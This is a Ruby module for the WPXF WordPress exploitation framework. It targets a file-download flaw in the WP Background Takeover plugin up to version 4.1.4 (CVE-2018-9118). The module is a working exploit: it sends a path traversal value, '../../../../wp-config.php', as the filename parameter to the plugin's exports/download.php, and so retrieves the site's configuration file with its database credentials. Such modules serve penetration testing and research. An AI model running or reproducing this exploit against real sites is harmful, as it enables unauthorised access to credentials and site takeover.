# frozen_string_literal: true

class Wpxf::Auxiliary::WpBackgroundTakeoverFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'WP Background Takeover <= 4.1.4 File Download',
      author: [
        'Colette Chamberland', # Disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['CVE', '2018-9118'],
        ['WPVDB', '9056']
      ],
      date: 'Apr 06 2018'
    )
  end

  def check
    check_plugin_version_from_readme('wpsite-background-takeover', '4.1.5')
  end

  def default_remote_file_path
    '../../../../wp-config.php'
  end

  def working_directory
    'wp-content/plugins/wpsite-background-takeover/exports/'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'wpsite-background-takeover', 'exports', 'download.php')
  end

  def download_request_params
    { 'filename' => remote_file }
  end
end
